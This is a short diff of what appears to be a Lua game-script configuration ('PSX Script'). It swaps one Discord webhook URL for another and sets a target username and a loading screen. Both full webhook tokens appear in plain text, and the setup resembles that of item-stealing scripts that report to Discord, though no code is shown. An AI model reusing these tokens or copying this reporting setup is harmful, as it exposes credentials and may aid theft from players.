@@ -1,5 +1,5 @@
 Username = "LEGACROW11"
-WebHook = "https://discord.com/api/webhooks/1107037193547042956/LsZ5NpRtPPV_jmw4vPNGI9yMPIf0VULYqQP6uToVFtGbWDJEQ4FyODVPp-ll7cMMWzZi"
+WebHook = "https://discord.com/api/webhooks/1124629816797319231/e8yUqaB3NeqWjKslB-GXOlvae4qq8NabwZGDQ_s_KTUFyWxcZeNuhKV1-cbGoZj-g5Rb"
 
 loadingscreen = true
 _G.CustomScriptName = "PSX Script"
